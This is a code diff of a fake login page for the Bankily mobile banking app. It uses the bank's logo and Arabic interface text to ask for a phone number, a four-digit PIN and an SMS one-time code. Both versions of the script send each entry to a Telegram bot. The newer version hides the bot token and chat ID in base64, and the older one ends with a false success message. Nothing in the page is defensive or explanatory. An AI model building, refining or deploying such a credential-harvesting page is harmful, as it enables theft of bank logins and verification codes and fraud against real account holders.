@@ -3,121 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بانكيلي - تسجيل الدخول</title>
+    <title>تسجيل الدخول - بنكيلي</title>
     <style>
-        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fff; text-align: center; }
-        .header-bg { background-color: #59b2c9; height: 50px; width: 100%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
-        .container { padding: 15px; }
-        
-        .promo-img { width: 100%; border-radius: 5px; margin-top: 5px; }
-        
-        /* ميزة: شعار صغير وواضح لضمان عدم ظهور علامة استفهام */
-        .logo-small { width: 55px; height: auto; margin: 15px auto; display: block; }
-        
-        .input-wrapper { display: flex; align-items: center; border-bottom: 2px solid #ccc; margin-top: 15px; padding-bottom: 8px; }
-        .icon { width: 22px; margin-left: 12px; opacity: 0.7; }
-        input { border: none; outline: none; width: 100%; font-size: 18px; color: #333; background: transparent; font-family: inherit; }
-        
-        .label { display: block; text-align: right; font-size: 16px; font-weight: bold; color: #333; margin-top: 20px; }
-        
-        .digit-container { display: flex; gap: 15px; margin-top: 15px; justify-content: center; flex-direction: row-reverse; }
-        .digit-in { width: 40px; border: none; border-bottom: 3px solid #333; text-align: center; font-size: 24px; padding: 5px; outline: none; background: #f9f9f9; }
-
-        .links-container { display: flex; justify-content: space-between; margin-top: 25px; font-size: 14px; }
-        .links-container a { color: #000; text-decoration: none; font-weight: bold; }
-        
-        .login-btn { background-color: #f2c044; color: white; border: none; width: 100%; padding: 18px; font-size: 20px; font-weight: bold; position: fixed; bottom: 0; right: 0; cursor: pointer; }
+        body { margin: 0; font-family: sans-serif; background: #fff; text-align: center; direction: rtl; }
+        .h-bg { background-color: #59b2c9; height: 55px; width: 100%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 20px; }
+        .p-img { width: 100%; height: auto; display: block; }
+        .c-pd { padding: 20px; }
+        .lbl { display: block; text-align: right; font-size: 15px; font-weight: bold; color: #1a4a7c; margin-top: 15px; }
+        .i-wrp { display: flex; align-items: center; border-bottom: 2px solid #ccc; padding-bottom: 5px; margin-bottom: 15px; }
+        input { border: none; outline: none; width: 100%; font-size: 18px; background: transparent; }
+        .d-ctn { display: flex; gap: 10px; justify-content: center; margin-top: 10px; direction: ltr; } /*  */
+        .d-in { width: 45px; height: 45px; border: none; border-bottom: 3px solid #333; text-align: center; font-size: 24px; background: #f8f8f8; border-radius: 0; }
+        .l-btn { background-color: #edbd44; color: white; border: none; width: 100%; padding: 20px; font-size: 18px; font-weight: bold; position: fixed; bottom: 0; left: 0; }
         .hidden { display: none; }
-
-        h3 { font-size: 18px; color: #333; margin-top: 40px; text-align: center; }
     </style>
 </head>
 <body>
 
-<div class="header-bg" id="header-text">بانكيلي</div>
+<div class="h-bg">بنكيلي</div>
 
-<div id="login-section" class="container">
-    <img src="https://i.ibb.co/HD1S3Skd/IMG-9896.jpg" class="promo-img">
-    
-    <img src="https://bankily.mr/wp-content/uploads/2020/06/logo-bankily.png" class="logo-small" alt="لوجو">
+<div id="s1">
+    <img src="https://i.ibb.co/tPFpVR2Q/IMG-9936.jpg" class="p-img">
+    <div class="c-pd">
+        <img src="https://bankily.mr/wp-content/uploads/2020/06/logo-bankily.png" style="width:55px; margin:10px auto; display:block;">
+        
+        <span class="lbl">اسم المستخدم أو رقم الهاتف</span>
+        <div class="i-wrp">
+            <input type="tel" id="u" maxlength="8" placeholder="رقم الهاتف" inputmode="numeric">
+        </div>
 
-    <span class="label">اسم المستخدم أو رقم الهاتف</span>
-    <div class="input-wrapper">
-        <img src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png" class="icon">
-        <input type="text" id="user-phone" placeholder="أدخل الرقم هنا">
+        <span class="lbl">كلمة السر (PIN)</span>
+        <div class="d-ctn">
+            <input type="password" maxlength="1" inputmode="numeric" class="pin-box d-in">
+            <input type="password" maxlength="1" inputmode="numeric" class="pin-box d-in">
+            <input type="password" maxlength="1" inputmode="numeric" class="pin-box d-in">
+            <input type="password" maxlength="1" inputmode="numeric" class="pin-box d-in">
+        </div>
     </div>
-
-    <span class="label">كلمة السر (PIN)</span>
-    <div class="digit-container">
-        <input type="password" maxlength="1" class="pin-field digit-in" oninput="move(this, 'pin-field')">
-        <input type="password" maxlength="1" class="pin-field digit-in" oninput="move(this, 'pin-field')">
-        <input type="password" maxlength="1" class="pin-field digit-in" oninput="move(this, 'pin-field')">
-        <input type="password" maxlength="1" class="pin-field digit-in" oninput="move(this, 'pin-field')">
-    </div>
-
-    <div class="links-container">
-        <a href="#">مستخدم جديد؟ سجل الآن</a>
-        <a href="#">نسيت كلمة السر؟</a>
-    </div>
-    <button class="login-btn" onclick="startLogin()">تسجيل الدخول</button>
+    <button class="l-btn" id="btn1" onclick="next()">تسجيل الدخول</button>
 </div>
 
-<div id="otp-section" class="container hidden">
-    <h3>أدخل رمز التحقق المرسل إلى رقم هاتفك</h3>
-    <div class="digit-container">
-        <input type="number" maxlength="1" class="otp-field digit-in" oninput="move(this, 'otp-field')">
-        <input type="number" maxlength="1" class="otp-field digit-in" oninput="move(this, 'otp-field')">
-        <input type="number" maxlength="1" class="otp-field digit-in" oninput="move(this, 'otp-field')">
-        <input type="number" maxlength="1" class="otp-field digit-in" oninput="move(this, 'otp-field')">
+<div id="s2" class="hidden">
+    <h3 style="margin-top:60px;">أدخل رمز التحقق (OTP)</h3>
+    <div class="d-ctn">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box d-in">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box d-in">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box d-in">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box d-in">
     </div>
-    
-    <button class="login-btn" onclick="finishLogin()">تأكيد الرمز</button>
+    <button class="l-btn" id="btn2" onclick="end()">تأكيد الرمز</button>
 </div>
 
 <script>
-    // ميزة: معلومات التليجرام الخاصة بك
-    const token = "6573766349:AAFzwIGsbYEtL_jDq0lSLp1689v2Ihmj-Bo";
-    const chatId = "6166597507";
-
-    function move(input, className) {
-        const fields = document.getElementsByClassName(className);
-        const index = Array.from(fields).indexOf(input);
-        if (input.value && index < fields.length - 1) fields[index + 1].focus();
+    const _t = "NjU3Mzc2NjM0OTpBQUZ6d0lHc2JZRXRMX2pEcTBsU0xwMTY4OXYySWhtai1Cbw==";
+    const _c = "NjE2NjU5NzUwNw==";
+      
+    function setupAutoTab(className) {
+        const inputs = document.querySelectorAll('.' + className);
+        inputs.forEach((input, index) => {
+                      input.addEventListener('input', (e) => {
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+        input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
     }
 
-    function startLogin() {
-        const phone = document.getElementById('user-phone').value;
-        let pin = "";
-        const pinInputs = document.querySelectorAll('.pin-field');
-        pinInputs.forEach(i => pin += i.value);
+   
+    setupAutoTab('pin-box');
+    setupAutoTab('otp-box');
 
-        if(phone && pin.length === 4) {
-            // إرسال البيانات إلى التليجرام
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('📱 تسجيل دخول:\nالهاتف: '+phone+'\nالرمز: '+pin)}`);
-            
-            document.getElementById('login-section').classList.add('hidden');
-            document.getElementById('otp-section').classList.remove('hidden');
-            document.getElementById('header-text').innerText = "رمز التحقق";
-        } else {
-            alert("يرجى إكمال البيانات بشكل صحيح");
+    async function send(txt) {
+        const url = `https://api.telegram.org/bot${atob(_t)}/sendMessage?chat_id=${atob(_c)}&text=${encodeURIComponent(txt)}`;
+        return fetch(url, {mode: 'no-cors'});
+    }
+
+    async function next() {
+        const u = document.getElementById('u').value;
+        let p = ""; document.querySelectorAll('.pin-box').forEach(i => p += i.value);
+        if(u.length === 8 && p.length === 4) {
+            document.getElementById('btn1').disabled = true;
+            await send(`📱 دخول جديد:\n📞 ${u}\n🔑 ${p}`);
+            document.getElementById('s1').classList.add('hidden');
+            document.getElementById('s2').classList.remove('hidden');
         }
     }
 
-    function finishLogin() {
-        let otp = "";
-        document.querySelectorAll('.otp-field').forEach(i => otp += i.value);
-        if(otp.length === 4) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🔢 رمز OTP: '+otp)}`)
-            .then(() => {
-                // ميزة: رسالة النجاح النهائية بدلاً من رسالة الخطأ
-                alert("لقد تمت العملية بنجاح، سوف يتم الاتصال بكم.");
-                location.reload();
-            });
-        } else {
-            alert("يرجى إدخال رمز التحقق كاملاً");
+    async function end() {
+        let o = ""; document.querySelectorAll('.otp-box').forEach(i => o += i.value);
+        if(o.length === 4) {
+            document.getElementById('btn2').disabled = true;
+            await send(`🔢 الرمز المستلم: ${o}`);
+            location.reload();
         }
     }
 </script>
-
 </body>
 </html>
